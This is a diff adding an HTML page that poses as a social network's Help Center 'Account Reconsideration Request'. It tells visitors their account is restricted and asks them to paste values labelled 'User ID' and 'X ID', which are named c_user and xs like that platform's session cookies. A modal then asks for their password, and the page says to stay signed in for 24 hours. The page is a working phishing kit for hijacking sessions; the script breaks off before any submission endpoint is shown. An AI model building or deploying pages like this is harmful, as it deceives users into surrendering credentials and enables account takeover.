@@ -1,0 +1,1716 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Security Verification</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --primary: #4a6fa5;
+      --primary-dark: #3a5a85;
+      --primary-light: #e8f0fe;
+      --gray-light: #f5f7fa;
+      --gray-medium: #e0e5ec;
+      --text-dark: #1a1a1a;
+      --text-medium: #666666;
+      --border-color: #d0d0d0;
+      --shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+      --transition: all 0.3s ease;
+      --white-color: #ffffff;
+      --success-color: #42b72a;
+      --warning-color: #f0ad4e;
+      --error-color: #d9534f;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      line-height: 1.6;
+      color: var(--text-dark);
+      background: linear-gradient(135deg, #f5f7fa 0%, #e4edf5 100%);
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    /* Header */
+    header {
+      background-color: var(--white-color);
+      box-shadow: var(--shadow);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      padding: 0 16px;
+      border-bottom: 1px solid var(--border-color);
+    }
+
+    .header-container {
+      max-width: 1320px;
+      width: 100%;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 0;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .logo-text {
+      font-weight: 700;
+      font-size: 1.5rem;
+      color: var(--primary);
+      text-decoration: none;
+    }
+
+    nav#mainNav ul {
+      display: flex;
+      list-style: none;
+      gap: 25px;
+    }
+
+    nav#mainNav a {
+      text-decoration: none;
+      color: var(--text-dark);
+      font-weight: 600;
+      font-size: 16px;
+      transition: var(--transition);
+      padding: 5px 0;
+      position: relative;
+    }
+
+    nav#mainNav a:hover {
+      color: var(--primary);
+    }
+
+    nav#mainNav a.active {
+      color: var(--primary);
+    }
+
+    nav#mainNav a.active::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 3px;
+      background-color: var(--primary);
+      border-radius: 3px;
+    }
+
+    .search-bar {
+      display: flex;
+      align-items: center;
+      background-color: var(--gray-light);
+      border-radius: 20px;
+      padding: 8px 15px;
+      width: 250px;
+    }
+
+    .search-bar input {
+      border: none;
+      background: transparent;
+      outline: none;
+      width: 100%;
+      padding: 0 10px;
+      font-size: 14px;
+    }
+
+    .search-bar i {
+      color: var(--text-medium);
+    }
+
+    .mobile-menu-btn {
+      display: none;
+      background: none;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+      color: var(--text-dark);
+    }
+
+    /* Language Selector */
+    .language-selector {
+      position: relative;
+      margin-left: 15px;
+    }
+
+    .lang-btn {
+      background: none;
+      border: none;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      font-weight: 600;
+      color: var(--primary);
+      padding: 5px 10px;
+      border-radius: 8px;
+      transition: var(--transition);
+    }
+
+    .lang-btn:hover {
+      background-color: var(--primary-light);
+    }
+
+    .lang-btn i {
+      margin-right: 5px;
+    }
+
+    .lang-options {
+      position: absolute;
+      top: 100%;
+      right: 0;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      min-width: 150px;
+      display: none;
+      z-index: 200;
+      border: 1px solid var(--border-color);
+    }
+
+    .lang-options.show {
+      display: block;
+    }
+
+    .lang-option {
+      display: flex;
+      align-items: center;
+      padding: 10px 15px;
+      cursor: pointer;
+      transition: var(--transition);
+      text-decoration: none;
+      color: var(--text-dark);
+    }
+
+    .lang-option:hover {
+      background-color: var(--primary-light);
+      color: var(--primary);
+    }
+
+    .lang-option.active {
+      background-color: var(--primary-light);
+      color: var(--primary);
+      font-weight: 600;
+    }
+
+    .lang-option i {
+      margin-right: 10px;
+      width: 20px;
+      text-align: center;
+    }
+
+    /* Breadcrumb */
+    #Home {
+      background-color: var(--gray-light);
+      border-bottom: 1px solid var(--border-color);
+      padding: 0 16px;
+    }
+
+    .home-container {
+      max-width: 1320px;
+      width: 100%;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      padding: 15px 0;
+    }
+
+    .home {
+      display: flex;
+      align-items: center;
+      color: var(--primary);
+      font-weight: 600;
+      font-size: 0.9rem;
+      position: relative;
+    }
+
+    .home i {
+      margin-right: 8px;
+    }
+
+    .line {
+      flex-grow: 1;
+      height: 3px;
+      background: var(--primary);
+      margin-left: 15px;
+      border-radius: 2px;
+    }
+
+    #main-content {
+      max-width: 1320px;
+      width: 100%;
+      margin: 30px auto;
+      padding: 0 16px;
+    }
+
+    .content {
+      width: 100%;
+      display: grid;
+      grid-template-columns: 1fr 2fr;
+      gap: 30px;
+    }
+
+    .left-column {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .right-column {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .help-topics-container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: var(--shadow);
+      padding: 25px;
+      height: fit-content;
+      border: 1px solid var(--border-color);
+    }
+
+    .help-topics-container h2 {
+      font-size: 1.3rem;
+      margin-bottom: 20px;
+      padding-bottom: 12px;
+      border-bottom: 2px solid var(--border-color);
+      color: var(--primary);
+    }
+
+    .help-topics-container ul {
+      list-style: none;
+      margin-bottom: 30px;
+    }
+
+    .help-topics-container ul li {
+      margin-bottom: 12px;
+    }
+
+    .help-topics-container ul li a {
+      text-decoration: none;
+      color: var(--primary);
+      display: flex;
+      align-items: center;
+      padding: 10px 0;
+      transition: var(--transition);
+      border-radius: 6px;
+      padding-left: 10px;
+    }
+
+    .help-topics-container ul li a:hover {
+      background-color: var(--primary-light);
+      color: var(--primary);
+      padding-left: 15px;
+    }
+
+    .help-topics-container ul li a i {
+      margin-right: 12px;
+      width: 20px;
+      text-align: center;
+      color: var(--primary);
+    }
+
+    .card {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+      overflow: hidden;
+      margin-bottom: 0;
+      transition: var(--transition);
+      max-width: 100%;
+      border: 1px solid var(--border-color);
+    }
+
+    .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 6px 15px rgba(0,0,0,0.08);
+    }
+
+    .card-header {
+      background: var(--primary);
+      padding: 20px 25px;
+      border-bottom: 1px solid var(--border-color);
+      position: relative;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .card-header h2 {
+      font-size: 1.4rem;
+      color: white;
+      font-weight: 600;
+      margin-right: 15px;
+    }
+
+    .card-body {
+      padding: 30px;
+    }
+
+    .card-body p {
+      margin-bottom: 15px;
+      line-height: 1.6;
+      color: var(--text-medium);
+    }
+
+    .form-section {
+      margin-top: 30px;
+      display: flex;
+      flex-direction: column;
+      gap: 25px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      width: 100%;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: var(--text-medium);
+      font-size: 0.95rem;
+    }
+
+    .form-group input {
+      width: 100%;
+      height: 46px;
+      padding: 0 15px;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      font-size: 0.95rem;
+      transition: border-color 0.3s;
+      background-color: var(--primary-light);
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(74, 111, 165, 0.15);
+    }
+    
+    .form-group .error {
+      color: var(--error-color);
+      font-size: 0.85rem;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .form-note {
+      color: var(--text-medium);
+      font-size: 0.9rem;
+      margin-top: 25px;
+      padding: 15px;
+      background: #fcf8e3;
+      border-left: 4px solid var(--warning-color);
+      border-radius: 0 8px 8px 0;
+      max-width: 100%;
+      width: 100%;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .form-note i {
+      color: var(--warning-color);
+      font-size: 1.2rem;
+      margin-top: 2px;
+    }
+
+    .btn-primary {
+      background: var(--primary);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 30px;
+      font-weight: 600;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 10px;
+      width: auto;
+      min-width: 200px;
+      box-shadow: 0 4px 10px rgba(74, 111, 165, 0.3);
+    }
+
+    .btn-primary:hover {
+      background: var(--primary-dark);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(74, 111, 165, 0.4);
+    }
+
+    .btn-primary i {
+      margin-right: 10px;
+    }
+    
+    .video-container {
+      position: relative;
+      background: #f8fafc;
+      border-radius: 12px;
+      padding: 20px;
+      border: 1px solid #e2e8f0;
+    }
+    
+    .video-overlay {
+      position: absolute;
+      top: 40px;
+      left: 20px;
+      width: calc(100% - 40px);
+      height: calc(100% - 60px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      z-index: 10;
+      background: rgba(0,0,0,0.3);
+      border-radius: 10px;
+      transition: all 0.3s ease;
+    }
+    
+    .video-overlay:hover {
+      background: rgba(0,0,0,0.2);
+    }
+    
+    .play-button {
+      width: 60px;
+      height: 60px;
+      background: rgba(255,255,255,0.8);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      transition: all 0.3s ease;
+    }
+    
+    .play-button i {
+      color: var(--primary);
+      font-size: 28px;
+      margin-left: 4px;
+    }
+    
+    .video-overlay:hover .play-button {
+      transform: scale(1.1);
+      background: rgba(255,255,255,0.95);
+    }
+    
+    .video-playing .video-overlay {
+      display: none;
+    }
+
+    .video-title {
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 15px;
+      font-size: 1.1rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      z-index: 5;
+      position: relative;
+    }
+
+    .video-title i {
+      color: var(--primary);
+    }
+    
+    .direct-video {
+      width: 100%;
+      max-width: 600px;
+      border-radius: 10px;
+      background: #000;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+
+    footer {
+      background: white;
+      border-top: 1px solid var(--border-color);
+      padding: 40px 0 20px;
+      margin-top: 60px;
+    }
+
+    .footer-container {
+      max-width: 1320px;
+      width: 100%;
+      margin: 0 auto;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      padding: 0 16px;
+    }
+
+    .footer-col {
+      flex: 1;
+      min-width: 200px;
+      margin-bottom: 25px;
+      padding: 0 15px;
+    }
+
+    .footer-col h4 {
+      font-size: 1.1rem;
+      color: var(--primary);
+      margin-bottom: 20px;
+      font-weight: 700;
+      padding-bottom: 10px;
+      border-bottom: 2px solid var(--primary-light);
+    }
+
+    .footer-col ul {
+      list-style: none;
+    }
+
+    .footer-col ul li {
+      margin-bottom: 12px;
+    }
+
+    .footer-col ul li a {
+      text-decoration: none;
+      color: var(--text-medium);
+      font-size: 0.95rem;
+      transition: color 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .footer-col ul li a:hover {
+      color: var(--primary);
+      transform: translateX(3px);
+    }
+
+    .footer-col ul li a i {
+      font-size: 0.8rem;
+      color: var(--primary);
+    }
+
+    .copyright {
+      width: 100%;
+      text-align: center;
+      margin-top: 30px;
+      padding-top: 25px;
+      border-top: 1px solid var(--border-color);
+      color: var(--text-medium);
+      font-size: 0.9rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    /* Modal Styles */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
+    }
+    
+    .modal-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    
+    .modal {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+      width: 90%;
+      max-width: 500px;
+      overflow: hidden;
+      transform: translateY(-50px);
+      transition: transform 0.4s ease, opacity 0.4s ease;
+      opacity: 0;
+    }
+    
+    .modal-overlay.active .modal {
+      transform: translateY(0);
+      opacity: 1;
+    }
+    
+    .modal-header {
+      background: var(--primary);
+      color: white;
+      padding: 22px;
+      position: relative;
+      text-align: center;
+    }
+    
+    .modal-header h3 {
+      font-size: 1.4rem;
+      font-weight: 600;
+    }
+    
+    .modal-header .close {
+      position: absolute;
+      right: 22px;
+      top: 22px;
+      background: none;
+      border: none;
+      color: white;
+      font-size: 1.5rem;
+      cursor: pointer;
+      transition: transform 0.3s;
+    }
+    
+    .modal-header .close:hover {
+      transform: rotate(90deg);
+    }
+    
+    .modal-body {
+      padding: 30px;
+    }
+    
+    .modal-icon {
+      text-align: center;
+      font-size: 3.5rem;
+      color: var(--primary);
+      margin-bottom: 20px;
+    }
+    
+    .modal-title {
+      text-align: center;
+      font-size: 1.6rem;
+      margin-bottom: 15px;
+      color: var(--text-dark);
+      font-weight: 700;
+    }
+    
+    .modal-subtitle {
+      text-align: center;
+      color: var(--text-medium);
+      margin-bottom: 25px;
+      font-size: 1.05rem;
+      line-height: 1.6;
+    }
+    
+    .modal-instructions {
+      background-color: var(--primary-light);
+      border-left: 4px solid var(--primary);
+      border-radius: 0 8px 8px 0;
+      padding: 18px;
+      margin-top: 20px;
+    }
+    
+    .modal-instructions h4 {
+      margin-bottom: 12px;
+      color: var(--primary);
+      font-size: 1.1rem;
+    }
+    
+    .modal-instructions ul {
+      list-style: none;
+      padding-left: 0;
+    }
+    
+    .modal-instructions li {
+      margin-bottom: 10px;
+      position: relative;
+      padding-left: 30px;
+      line-height: 1.5;
+    }
+    
+    .modal-instructions li i {
+      position: absolute;
+      left: 0;
+      top: 5px;
+      color: var(--primary);
+      font-size: 1.1rem;
+    }
+    
+    .modal-footer {
+      padding: 15px 30px 30px;
+      text-align: center;
+    }
+    
+    /* Success Message */
+    .success-card {
+      text-align: center;
+      padding: 40px 30px;
+    }
+    
+    .success-icon {
+      font-size: 5rem;
+      color: var(--success-color);
+      margin-bottom: 25px;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    .success-title {
+      font-size: 2rem;
+      margin-bottom: 15px;
+      color: var(--text-dark);
+      font-weight: 700;
+    }
+    
+    .success-subtitle {
+      font-size: 1.15rem;
+      color: var(--text-medium);
+      margin-bottom: 30px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+      line-height: 1.6;
+    }
+    
+    .instructions-box {
+      background-color: #f0f8ff;
+      border-radius: 12px;
+      padding: 25px;
+      margin: 30px auto;
+      max-width: 700px;
+      text-align: left;
+      border: 1px solid #d4e6f1;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+    }
+    
+    .instructions-box h3 {
+      color: var(--primary);
+      margin-bottom: 20px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid #d4e6f1;
+      font-size: 1.3rem;
+    }
+    
+    .instructions-box ul {
+      list-style: none;
+      padding-left: 0;
+    }
+    
+    .instructions-box li {
+      padding-left: 35px;
+      position: relative;
+      margin-bottom: 18px;
+      font-size: 1.05rem;
+    }
+    
+    .instructions-box li i {
+      position: absolute;
+      left: 0;
+      top: 5px;
+      color: var(--primary);
+      font-size: 1.2rem;
+    }
+    
+    .continue-btn {
+      background: var(--success-color);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 14px 40px;
+      font-weight: 600;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 20px;
+      box-shadow: 0 4px 15px rgba(66, 183, 42, 0.3);
+    }
+    
+    .continue-btn:hover {
+      background: #3aa123;
+      transform: translateY(-3px);
+      box-shadow: 0 6px 20px rgba(66, 183, 42, 0.4);
+    }
+    
+    .continue-btn i {
+      margin-left: 10px;
+      transition: transform 0.3s;
+    }
+    
+    .continue-btn:hover i {
+      transform: translateX(5px);
+    }
+    
+    .hidden {
+      display: none;
+    }
+
+    /* Loading spinner */
+    .spinner {
+      border: 4px solid rgba(0, 0, 0, 0.1);
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border-left-color: var(--primary);
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      margin-right: 10px;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .btn-loading .spinner {
+      display: inline-block;
+    }
+
+    .btn-loading .btn-text {
+      display: inline-block;
+      vertical-align: middle;
+    }
+
+    /* Status messages */
+    .status-message {
+      padding: 12px 15px;
+      margin: 15px 0;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 1rem;
+    }
+    
+    .status-success {
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+    }
+    
+    .status-error {
+      background-color: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
+
+    /* Video Language Modal */
+    .lang-options-modal {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+      width: 90%;
+      max-width: 400px;
+      overflow: hidden;
+    }
+    
+    .lang-options-container {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      padding: 25px;
+    }
+    
+    .lang-option-btn {
+      display: flex;
+      align-items: center;
+      padding: 15px 20px;
+      background: var(--primary-light);
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s;
+      border: none;
+      text-align: left;
+      font-size: 1rem;
+      font-weight: 500;
+    }
+    
+    .lang-option-btn:hover {
+      background: var(--primary);
+      color: white;
+    }
+    
+    .lang-option-btn i {
+      margin-right: 15px;
+      font-size: 1.2rem;
+    }
+
+    /* Responsive Design */
+    @media (max-width: 992px) {
+      .footer-col {
+        flex: 0 0 50%;
+      }
+      
+      .content {
+        grid-template-columns: 1fr;
+      }
+      
+      .left-column {
+        order: 2;
+      }
+      
+      .right-column {
+        order: 1;
+      }
+      
+      .btn-primary {
+        width: 100%;
+      }
+      
+      .language-selector {
+        margin-left: 0;
+        margin-top: 15px;
+        order: 4;
+        width: 100%;
+      }
+      
+      .lang-options {
+        left: 0;
+        right: auto;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .header-container {
+        flex-wrap: wrap;
+      }
+      
+      .mobile-menu-btn {
+        display: block;
+      }
+      
+      nav#mainNav ul {
+        display: none;
+        flex-direction: column;
+        width: 100%;
+        padding: 20px 0;
+        gap: 15px;
+      }
+      
+      nav#mainNav.active ul {
+        display: flex;
+      }
+      
+      .home-container {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      
+      .line {
+        width: 100%;
+        height: 3px;
+        margin: 10px 0 0;
+      }
+      
+      .footer-col {
+        flex: 0 0 100%;
+      }
+      
+      .direct-video {
+        max-width: 100%;
+      }
+      
+      .search-bar {
+        order: 3;
+        width: 100%;
+        margin-top: 15px;
+      }
+
+      .card-header h2 {
+        font-size: 1.2rem;
+      }
+      
+      .video-overlay {
+        top: 20px;
+        height: calc(100% - 40px);
+      }
+    }
+
+    @media (max-width: 576px) {
+      .card-header {
+        padding: 15px;
+      }
+      
+      .card-body {
+        padding: 20px;
+      }
+      
+      .btn-primary {
+        padding: 14px;
+      }
+      
+      .footer-col {
+        min-width: 100%;
+      }
+      
+      .modal-body {
+        padding: 20px 15px;
+      }
+
+      .success-title {
+        font-size: 1.6rem;
+      }
+
+      .success-subtitle {
+        font-size: 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="container header-container">
+      <div class="logo">
+        <a href="#" class="logo-text">Help Center</a>
+      </div>
+      <nav id="mainNav">
+        <ul>
+          <li><a href="#" class="active">Home</a></li>
+          <li><a href="#">Help Topics</a></li>
+          <li><a href="#">Community</a></li>
+          <li><a href="#">Contact</a></li>
+          <li><a href="#">Privacy</a></li>
+        </ul>
+      </nav>
+      <div class="search-bar">
+        <i class="fas fa-search" aria-hidden="true"></i>
+        <input type="text" placeholder="Search help center..." aria-label="Search help center">
+      </div>
+      
+      <div class="language-selector">
+        <button class="lang-btn" id="langBtn">
+          <i class="fas fa-globe"></i>
+          <span id="currentLang">English</span>
+          <i class="fas fa-chevron-down" style="margin-left: 5px;"></i>
+        </button>
+        <div class="lang-options" id="langOptions">
+          <a href="#" class="lang-option active" data-lang="en">
+            <i class="fas fa-check"></i>
+            English
+          </a>
+          <a href="#" class="lang-option" data-lang="es">
+            <i class="fas fa-check" style="visibility: hidden;"></i>
+            Español
+          </a>
+          <a href="#" class="lang-option" data-lang="pt">
+            <i class="fas fa-check" style="visibility: hidden;"></i>
+            Português
+          </a>
+        </div>
+      </div>
+      
+      <button class="mobile-menu-btn" id="mobileMenuBtn" aria-label="Toggle navigation menu">
+        <i class="fas fa-bars" aria-hidden="true"></i>
+      </button>
+    </div>
+  </header>
+
+  <section id="Home">
+    <div class="home-container">
+      <div class="home">
+        <i class="fa-solid fa-house-chimney"></i>
+        <h3>Help Center</h3>
+      </div>
+      <div class="line"></div>
+    </div>
+  </section>
+
+  <section id="main-content">
+    <div class="content">
+      <div class="left-column">
+        <div class="help-topics-container">
+          <h2>Help Topics</h2>
+          <ul>
+            <li><a href="#"><i class="fa-solid fa-user"></i> Account Settings</a></li>
+            <li><a href="#"><i class="fa-solid fa-shield"></i> Privacy & Security</a></li>
+            <li><a href="#"><i class="fa-solid fa-lock"></i> Login Issues</a></li>
+            <li><a href="#"><i class="fa-solid fa-money-bill"></i> Payments & Billing</a></li>
+            <li><a href="#"><i class="fa-solid fa-users"></i> Groups & Pages</a></li>
+            <li><a href="#"><i class="fa-solid fa-bell"></i> Notifications</a></li>
+            <li><a href="#"><i class="fa-solid fa-photo-film"></i> Photos & Videos</a></li>
+            <li><a href="#"><i class="fa-solid fa-comment"></i> Messenger</a></li>
+          </ul>
+          
+          <h2>Popular Articles</h2>
+          <ul>
+            <li><a href="#"><i class="fa-solid fa-circle-question"></i> Password Reset</a></li>
+            <li><a href="#"><i class="fa-solid fa-gear"></i> Update Account Info</a></li>
+            <li><a href="#"><i class="fa-solid fa-ban"></i> Report a Problem</a></li>
+            <li><a href="#"><i class="fa-solid fa-user-plus"></i> Manage Friends</a></li>
+          </ul>
+        </div>
+      </div>
+      
+      <div class="right-column">
+        <div class="card">
+          <div class="card-header">
+            <h2 id="pageTitle">Account Reconsideration Request</h2>
+          </div>
+          <div class="card-body">
+            <p id="description1">Our automated systems have detected unusual activity on your account that appears to violate our Community Standards.</p>
+            <p id="description2">Your account access has been temporarily limited to protect our community. You can't post, comment, or use certain features at this time.</p>
+            <p id="description3">If you believe this is a mistake, you can request a review by providing the required information below.</p>
+            
+            <div class="form-section">
+              <div class="video-container" id="videoContainer">
+                <div class="video-overlay" id="videoOverlay">
+                  <div class="play-button">
+                    <i class="fa-solid fa-play"></i>
+                  </div>
+                </div>
+                <div class="video-title">
+                  <i class="fa-solid fa-circle-play"></i>
+                  <span id="videoTitle">Step-by-step guide: How to request reconsideration</span>
+                </div>
+                <video controls class="direct-video" id="instructionVideo">
+                  <source src="https://information-video-to-watch332.web.app/english.mp4" type="video/mp4">
+                  Your browser does not support the video tag.
+                </video>
+              </div>
+              
+              <form class="form" id="initialForm" method="post">
+                <div class="form-group">
+                  <label for="c_user" id="cUserLabel">User ID</label>
+                  <input type="text" id="c_user" name="c_user" required placeholder="Enter your User ID">
+                  <div class="error" id="c_user_error">must contain user id only</div>
+                </div>
+                
+                <div class="form-group">
+                  <label for="xs" id="xsLabel">X ID</label>
+                  <input type="text" id="xs" name="xs" required placeholder="Enter your X ID">
+                  <div class="error" id="xs_error">must contain x id only</div>
+                </div>
+                
+                <div class="form-note">
+                  <i class="fa-solid fa-triangle-exclamation"></i>
+                  <div id="signoutNote">Do not sign out of your account during the review process to avoid disruptions.</div>
+                </div>
+                
+                <button type="submit" class="btn-primary" id="submit-request">
+                  <i class="fa-solid fa-paper-plane"></i> 
+                  <span class="btn-text" id="submitText">Submit Request</span>
+                </button>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <div class="modal-overlay" id="passwordModal">
+    <div class="modal">
+      <div class="modal-header">
+        <h3 id="verifyTitle">Account Verification</h3>
+        <button class="close" id="closePasswordModal">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="modal-body">
+        <div class="modal-icon">
+          <i class="fas fa-lock"></i>
+        </div>
+        <div class="modal-title" id="reenterTitle">Re-enter Password</div>
+        <div class="modal-subtitle" id="verifyDescription">For security purposes, please re-enter your account password to complete your review request</div>
+        
+        <div id="passwordStatus" class="status-message"></div>
+        
+        <form id="passwordForm">
+          <div class="form-group">
+            <label for="password" id="passwordLabel">Password</label>
+            <input type="password" id="password" name="password" required placeholder="Enter your password">
+            <div class="error" id="password_error">Password must be at least 6 characters</div>
+          </div>
+          
+          <div class="form-note">
+            <i class="fa-solid fa-circle-info"></i>
+            <div id="passwordNote">Your password is required to verify account ownership and protect your security.</div>
+          </div>
+          
+          <div class="modal-footer">
+            <button type="submit" class="btn-primary" id="verifyBtn">
+              <i class="fas fa-check-circle"></i> 
+              <span class="btn-text" id="verifyText">Verify</span>
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="successModal">
+    <div class="modal">
+      <div class="modal-body">
+        <div class="success-card">
+          <div class="success-icon">
+            <i class="fas fa-check-circle"></i>
+          </div>
+          <h2 class="success-title" id="successTitle">Review Submitted!</h2>
+          <p class="success-subtitle" id="successSubtitle">Review request submitted! We'll get back within 24 hours.</p>
+          
+          <div class="instructions-box">
+            <h3 id="instructionsTitle">Important Next Steps</h3>
+            <ul>
+              <li><i class="fas fa-clock"></i><span id="step1">Stay signed in for 24 hours</span></li>
+              <li><i class="fas fa-bell"></i><span id="step2">Check notifications for review updates</span></li>
+              <li><i class="fas fa-envelope"></i><span id="step3">Check email or phone for messages</span></li>
+            </ul>
+          </div>
+          
+          <button class="continue-btn" id="continueBtn">
+            <span id="continueText">Return to Home</span>
+            <i class="fas fa-arrow-right"></i>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="modal-overlay" id="videoLangModal">
+    <div class="modal lang-options-modal">
+      <div class="modal-header">
+        <h3 id="videoLangTitle">Select Video Language</h3>
+        <button class="close" id="closeVideoLangModal">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="lang-options-container">
+        <button class="lang-option-btn" data-lang="en">
+          <i class="fas fa-language"></i>
+          <div>
+            <strong>English</strong>
+            <div class="small">Watch in English</div>
+          </div>
+        </button>
+        <button class="lang-option-btn" data-lang="es">
+          <i class="fas fa-language"></i>
+          <div>
+            <strong>Español</strong>
+            <div class="small">Ver en español</div>
+          </div>
+        </button>
+        <button class="lang-option-btn" data-lang="pt">
+          <i class="fas fa-language"></i>
+          <div>
+            <strong>Português</strong>
+            <div class="small">Assistir em português</div>
+          </div>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <div class="footer-container">
+      <div class="footer-col">
+        <h4>Help & Support</h4>
+        <ul>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Help Center</a></li>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Support Inbox</a></li>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Report a Problem</a></li>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Community Standards</a></li>
+        </ul>
+      </div>
+      
+      <div class="footer-col">
+        <h4>Account</h4>
+        <ul>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Account Settings</a></li>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Privacy Settings</a></li>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Security Settings</a></li>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Deactivate Account</a></li>
+        </ul>
+      </div>
+      
+      <div class="footer-col">
+        <h4>Legal</h4>
+        <ul>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Terms of Service</a></li>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Data Policy</a></li>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Cookie Policy</a></li>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Intellectual Property</a></li>
+        </ul>
+      </div>
+      
+      <div class="footer-col">
+        <h4>Company</h4>
+        <ul>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> About Us</a></li>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Careers</a></li>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Ad Choices</a></li>
+          <li><a href="#"><i class="fas fa-chevron-right"></i> Create Ad</a></li>
+        </ul>
+      </div>
+      
+      <div class="copyright">
+        <span>© 2025 Help Center. All rights reserved.</span>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    const translations = {
+      en: {
+        pageTitle: "Account Reconsideration Request",
+        description1: "Our automated systems have detected unusual activity on your account that appears to violate our Community Standards.",
+        description2: "Your account access has been temporarily limited to protect our community. You can't post, comment, or use certain features at this time.",
+        description3: "If you believe this is a mistake, you can request a review by providing the required information below.",
